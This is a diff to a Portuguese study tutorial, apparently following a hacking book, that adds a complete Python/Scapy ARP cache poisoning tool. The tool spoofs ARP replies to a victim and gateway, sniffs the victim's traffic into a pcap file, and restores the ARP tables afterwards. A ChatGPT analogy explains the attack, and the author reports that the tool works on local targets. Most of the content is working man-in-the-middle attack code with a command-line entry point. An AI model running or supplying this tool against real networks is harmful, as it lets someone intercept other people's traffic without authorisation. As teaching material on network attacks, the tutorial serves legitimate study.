@@ -234,4 +234,175 @@ def get_mac(target_ip):
 
 Agora nossa função poderá capturar o endereço MAC tanto da nossa vítima quanto do nosso gateway, que nos permitirá executar o enevenamento sem ter que usar o comandos acima. Em seguida, modificaremos nossa classe `Arper`:
 
+```py
+from multiprocessing import Event, Process
+from scapy.all import (ARP, Ether, conf, get_if_hwaddr, 
+                       send, sniff, sndrcv, srp, wrpcap,sendp)
+import os
+import sys
+import time
+
+def get_mac(target_ip):
+    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op='who-has', pdst=target_ip)
+    resp, _ = srp(packet, timeout=2, verbose=False)
+    for _, r in resp:
+        return r[Ether].src
+    return None
+
+class Arper:
+    # Instanciação da classe, com os parametros de IP dados. Note que pegamos os MAC dinamicamente
+    def __init__(self, victim, gateway, interface='Wi-fi'):
+        self.victim = victim
+        self.victimmac = get_mac(victim)
+        self.gateway = gateway
+        self.gatewaymac = get_mac(gateway)
+        self.interface = interface
+        conf.iface = interface
+        conf.verb = 0
+        # Event() é uma variável da lib de multiprocessing para ajudar a determinar quando encerrar um processo
+        self.stop_event = Event()
+        
+        print(f'{interface} inicializada:')
+        print(f'Gateway ({gateway}) está em {self.gatewaymac}')
+        print(f'Vítima ({self.victim}) está em {self.victimmac}')
+        print('-'*30)
+    
+    # Função run(), executa o que deve ser usado na lógica principal
+    # Não são instanciadas `self.threads` pois isso causa um erro de tipagem no
+    # Process. 
+    def run(self):
+        # Thread de poison (que recebe o evento de parada - Ctrl + C)
+        poison_thread = Process(target=self.poison, args=(self.stop_event,))
+        poison_thread.start()
+        
+        # Thread de sniffing, que recebe a contagem de pacotes a serem recebidos 
+        sniff_thread = Process(target=self.sniff, args=(10,))
+        sniff_thread.start()
+        
+        # Aguarda as duas threads terminarem 
+        poison_thread.join()
+        sniff_thread.join()
+ 
+    # Função poison:
+    # Basicamente ela envia 2 pacotes, um para o roteador (interface) outro para o alvo
+    # Para o roteador ela fala "Esse endereço de IP da vítima, encontra-se no MAC do atacante"
+    # Para a vítima ela fala "Esse endereço de IP do roteador, encontra-se no MAC do atacante"
+    #
+    # Logo, ao enviar a mensagem pelo protocolo "is-at", que é o protocolo-padrão de solução da tabela ARP
+    # Ambos acreditarão que devem mandar mensagem para o nosso MAC, ao invés de entre si, o que nos permintirá interceptar os pacotes
+    def poison(self, stop_event):
+        # Instancia da primeira mensagem ARP
+        poison_victim = ARP()
+        poison_victim.op = 2                                    # op = 'is-at'
+        poison_victim.psrc = self.gateway                       # o IP source deve ser do gateway, para simular que o próprio roteador está enviando a mensagem
+        poison_victim.pdst = self.victim                        # o IP deve ser o IP da vítima (pois a mensagem é para ela)
+        poison_victim.hwdst = self.victimmac                    # o MAC destino é o da vítima (pois a mensagem é para ela)
+        poison_victim.hwsrc = get_if_hwaddr(self.interface)     # o MAC source deve ser o nosso, para ela entender que nós somos o roteador
+        print(f'IP de origem: {poison_victim.psrc}')
+        print(f'IP de destino: {poison_victim.pdst}')
+        print(f'MAC de destino: {poison_victim.hwdst}')
+        print(f'MAC de origem: {poison_victim.hwsrc}')
+        print(poison_victim.summary())                          # Print de resumo da mensagem
+        print('-'*30)
+        
+        poison_gateway = ARP()                                  # Algo equivalente mas configurado para o roteador
+        poison_gateway.op = 2
+        poison_gateway.psrc = self.victim
+        poison_gateway.pdst = self.gateway
+        poison_gateway.hwdst = self.gatewaymac
+        poison_gateway.hwsrc = get_if_hwaddr(self.interface)
+        print(f'IP de origem: {poison_gateway.psrc}')
+        print(f'IP de destino: {poison_gateway.pdst}')
+        print(f'MAC de destino: {poison_gateway.hwdst}')
+        print(f'MAC de origem: {poison_gateway.hwsrc}')
+        print(poison_gateway.summary())
+        print('-'*30)
+        
+        print(f'Iniciando o envenenamento ARP. [CTRL+C para interromper]')
+        # Loop até o stop_event (Ctrl+C ou fim da função sniffing)
+        while not stop_event.is_set():
+            sys.stdout.write('.')       # sys.write() armazena no buffer de escrita a mensagem
+            sys.stdout.flush()          # sys.flush() escreve todo o buffer no terminal e limpa-o
+            try:
+                # Nessa parte o código difere do livro, pois nas versões recentes do Scapy, a função `send()`,
+                # usada originalmente, mandava pacotes tanto para a camada 3 (Rede, onde fica o IP, por exemplo)
+                # quanto para a camada 2 (Enlace, onde fica o ARP, que desejamos). Isso causava um WARNING 
+                # indesejado no terminal.
+                #
+                # Já a função `sendp()` envia um pacote específico para a camada 2, na Ethernet da interface local
+                # assim como o feito para descobrirmos os MAC. Anteriormente eram enviados para o `dst` (destination)
+                # ff:ff:ff:ff:ff:ff (que é um broadcast, pois é uma busca ampla para achar os MACs), mas agora devem ser
+                # enviados os pacotes especificamente para a vítima e para o gateway
+                sendp(Ether(dst=self.victimmac)/poison_victim, verbose=False)
+                sendp(Ether(dst=self.gatewaymac)/poison_gateway, verbose=False)
+                time.sleep(2)
+            # No Ctrl+C executa o `restore()`, que é uma função de envio da recorreção dos ARPs para os MACs originais
+            except KeyboardInterrupt:
+                self.restore()
+                stop_event.set()
+                sys.exit()
+                break
+        sys.exit()
+        
+    # A funçao de sniff é similar à anterior para o caso do email
+    def sniff(self, count=100):
+        time.sleep(5)
+        print(f'Capturando {count} pacotes')
+        # O filtro acha apenas pacotes relacionados ao IP da vítima
+        bpf_filter = "ip host %s" % self.victim
+        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
+        # Gera um arquivo pcap, que pode ser lido pelo Wireshark ou pelo programa que faremos em breve, com os pacotes
+        wrpcap('arper.pcap', packets)
+        print('Pacotes recebidos')
+        # Ao final, reinicia os ARPs
+        self.restore()
+        # Encerra a thread de poison
+        self.stop_event.set()
+        print('Concluido')
+    
+    # Basicamente envia uma pensagem para um broadcast (veja que não tem Ether(dst) na mensagem)
+    # Comn os dados originais no parametro `hwsrc`, corrigindo o MAC
+    def restore(self):
+        sendp(ARP(
+            op=2,
+            psrc=self.gateway,
+            hwsrc=self.gatewaymac,
+            pdst=self.victim,
+            hwdst='ff:ff:ff:ff:ff:ff'),
+            count=5, verbose=False)           
+        
+        sendp(ARP(
+            op=2,
+            psrc=self.victim,
+            hwsrc=self.victimmac,
+            pdst=self.gateway,
+            hwdst='ff:ff:ff:ff:ff:ff'),
+            count=5, verbose=False)       
+        print('\n\n\n\n\nRestaurando tabelas ARP...\n\n\n\n')
+
+    
+if __name__ == '__main__':
+    # Espera 3 argumentos do usuário, iniciar um objeto Arper e o inicia
+    if len(sys.argv) != 4:
+        print("*** Envenenamento ARP ***\n Como usar: \n\n arper.py [IP VITIMA] [IP GATEWAY] [INTEFACE]")
+        sys.exit()
+    (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
+    myarp = Arper(victim, gateway, interface)
+    myarp.run()
+```
+
+Caso exista ainda alguma dúvida de como esse envenenamento funciona, aqui está uma analogia feita pelo ChatGPT:
+
+`Imagine que você está em uma festa cheia de pessoas que não se conhecem bem, e alguém resolve bancar o "anfitrião enganador". Esse anfitrião começa a distribuir informações erradas sobre quem é quem na festa. Para uma pessoa, ele diz: "O fulano ali, que você está tentando encontrar, sou eu!", e para outra, afirma: "O anfitrião da festa sou eu, fale comigo!". Esse truque cria uma situação em que todos que deveriam se comunicar diretamente passam a depender desse anfitrião enganador, que intercepta todas as conversas.
+
+No ARP Cache Poisoning, o processo é semelhante. O atacante envia mensagens falsas para o roteador e a vítima usando o protocolo ARP. Para o roteador, diz: "O IP da vítima está associado ao meu MAC", e para a vítima, "O IP do roteador está associado ao meu MAC". Como o ARP não verifica a veracidade dessas informações, ambos passam a direcionar seus dados para o MAC do atacante. Dessa forma, o atacante se coloca no meio da comunicação, podendo interceptar, alterar ou até bloquear os pacotes de dados.`
+
+### Explorando o código
+
+Testou-se para IPs de máquinas alvos na rede local. Depois de muitos erros e correçÕes, funcionou.
+
+Pronto! Agora temos um Envenenador ARP funcional. Agora, encontraremos uma forma de tratar o arquivo `pcap`!
+
+### 
+
 
